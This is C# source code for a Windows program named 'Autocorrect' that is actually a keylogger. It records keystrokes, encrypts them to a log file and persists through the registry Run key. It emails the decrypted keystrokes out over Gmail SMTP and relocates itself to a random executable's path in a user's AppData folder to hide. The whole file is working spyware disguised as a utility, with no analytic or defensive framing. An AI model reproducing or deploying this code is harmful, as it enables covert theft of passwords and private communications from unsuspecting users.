using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.Net.Mail;

namespace Autocorrect
{
	class Program
	{
        // key presses
		[Flags]
		private enum KeyStates
		{
			None = 0,
			Down = 1,
			Toggled = 2
		}
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern short GetKeyState(int keyCode);

		private static KeyStates GetKeyState(Keys key)
		{
			KeyStates state = KeyStates.None;

			short retVal = GetKeyState((int)key);

			//If the high-order bit is 1, the key is down
			//otherwise, it is up.
			if ((retVal & 0x8000) == 0x8000)
				state |= KeyStates.Down;

			//If the low-order bit is 1, the key is toggled.
			if ((retVal & 1) == 1)
				state |= KeyStates.Toggled;

			return state;
		}

		public static bool IsKeyDown(Keys key)
		{
			return KeyStates.Down == (GetKeyState(key) & KeyStates.Down);
		}

		public static bool IsKeyToggled(Keys key)
		{
			return KeyStates.Toggled == (GetKeyState(key) & KeyStates.Toggled);
		}
        //
        private static byte[] key = Encoding.ASCII.GetBytes("1njanrhdkCnsahrebfdMvbjo32hqnd31");
        private static byte[] vec = Encoding.ASCII.GetBytes("jsKidmshatyb4jdu");
        public static string CryptAES(string textToCrypt)
        {
            try
            {
                using (var rijndaelManaged =
                       new RijndaelManaged { Key = key, IV = vec, Mode = CipherMode.CBC })
                using (var memoryStream = new MemoryStream())
                using (var cryptoStream =
                       new CryptoStream(memoryStream,
                           rijndaelManaged.CreateEncryptor(key, vec),
                           CryptoStreamMode.Write))
                {
                    using (var ws = new StreamWriter(cryptoStream))
                    {
                        ws.Write(textToCrypt);
                    }
                    return Convert.ToBase64String(memoryStream.ToArray());
                }
            }
            catch (CryptographicException e)
            {
                return null;
            }
        }
        public static string DecryptAES(string cipherData)
        {
            try
            {
                using (var rijndaelManaged =
                       new RijndaelManaged { Key = key, IV = vec, Mode = CipherMode.CBC })
                using (var memoryStream =
                       new MemoryStream(Convert.FromBase64String(cipherData)))
                using (var cryptoStream =
                       new CryptoStream(memoryStream,
                           rijndaelManaged.CreateDecryptor(key, vec),
                           CryptoStreamMode.Read))
                {
                    return new StreamReader(cryptoStream).ReadToEnd();
                }
            }
            catch (CryptographicException e)
            {
                return null;
            }
        }
        static private void SetStartup()
		{
			RegistryKey rk = Registry.CurrentUser.OpenSubKey
				("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

				rk.SetValue("Program", System.Reflection.Assembly.GetEntryAssembly().Location);

        }
        static string Log = "";
        static int i = 0;

        static void Main(string[] args)
		{

            if (File.Exists(@"C:\usmen.sql"))
            {
                SetStartup();
                while (true)
                {
                    if (true)
                    {
						#region keys
						if (IsKeyDown(Keys.A))
                        {
                            Log += "a";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.B))
                        {
                            Log += "b";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.C))
                        {
                            Log += "c";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.D))
                        {
                            Log += "d";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.E))
                        {
                            Log += "e";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.F))
                        {
                            Log += "f";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.G))
                        {
                            Log += "g";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.H))
                        {
                            Log += "h";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.I))
                        {
                            Log += "i";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.J))
                        {
                            Log += "j";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.K))
                        {
                            Log += "k";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.L))
                        {
                            Log += "l";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.M))
                        {
                            Log += "m";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.N))
                        {
                            Log += "n";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.O))
                        {
                            Log += "o";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.P))
                        {
                            Log += "p";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.Q))
                        {
                            Log += "q";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.R))
                        {
                            Log += "r";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.S))
                        {
                            Log += "s";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.T))
                        {
                            Log += "t";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.U))
                        {
                            Log += "u";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.V))
                        {
                            Log += "v";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.W))
                        {
                            Log += "w";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.X))
                        {
                            Log += "x";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.Y))
                        {
                            Log += "y";
                            Thread.Sleep(100);

                        }
                        if (IsKeyDown(Keys.Z))
                        {
                            Log += "z";
                            Thread.Sleep(100);
                        }
                        if (IsKeyDown(Keys.Space))
                        {
                            Log += " ";
                            Thread.Sleep(100);
                        }
						#endregion
					}
                    if(Log != "")
					{
                        File.AppendAllText("Log.txt", CryptAES(Log) + " ");

                        FileInfo fi = new FileInfo("Log.txt");
                        long size = fi.Length;
                        if (size > 100000)
                        {
                            Console.WriteLine(File.ReadAllText("Log.txt").Split(' ').Length);
                            for (int i = 0; i < File.ReadAllText("Log.txt").Split(' ').Length; i++)
                            {
                                //DECRTYPTION
                                Console.Write(DecryptAES(File.ReadAllText("Log.txt").Split(' ')[i]));
                                File.AppendAllText("Cleaned.txt", DecryptAES(File.ReadAllText("Log.txt").Split(' ')[i]));

                            }
                            
                            var client = new SmtpClient("smtp.gmail.com", 587)
                            {
                                Credentials = new NetworkCredential("EMAIL", "Password"),
                                EnableSsl = true
                            };
                            client.Send("EMAIL", "EMAIL", "Data From Logger", File.ReadAllText("Cleaned.txt"));

                            File.Delete("Cleaned.txt");

                            File.Delete("Log.txt"); File.Create("Log.txt").Close();
                        }

                        Log = "";
                        i = 0;
                    }

                }
            }
            else
            {
                File.AppendAllText(@"C:\usmen.sql", "hid");
                String[] Files = Directory.GetFiles(@"C:\Users\jojo0604\AppData\Roaming", "*.exe", SearchOption.AllDirectories);
                Random rnd = new Random();
                int a = rnd.Next(0, Files.Length);
                Console.WriteLine(Files[a]);
                File.Move(System.Reflection.Assembly.GetEntryAssembly().Location, Files[a]);
                Console.ReadLine();
            }
			
		}
	}
}
